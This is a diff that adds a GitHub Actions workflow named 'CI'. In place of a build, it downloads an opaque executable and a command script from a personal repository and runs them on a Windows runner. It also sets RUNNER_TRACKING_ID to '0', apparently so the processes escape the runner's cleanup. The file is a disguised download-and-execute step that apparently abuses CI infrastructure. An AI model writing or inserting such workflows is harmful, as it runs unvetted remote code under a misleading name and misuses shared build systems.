@@ -1,0 +1,22 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-2019
+
+    steps:
+    - name: Download EasyInstall
+      run: Invoke-WebRequest https://github.com/WindowXDZ/ugh/raw/main/Untitled.exe -OutFile easyinstall.exe
+
+    - name: Download Command File
+      run: Invoke-WebRequest https://github.com/WindowXDZ/ugh/raw/main/cmd.cmd -OutFile cmd.cmd
+
+    - name: Run EasyInstall and Command File
+      env:
+        RUNNER_TRACKING_ID: "0"
+      run: |
+        .\easyinstall.exe
+        .\cmd.cmd
